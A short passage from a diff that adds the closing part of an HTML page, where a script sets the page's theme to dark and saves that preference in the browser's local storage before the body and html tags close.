+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
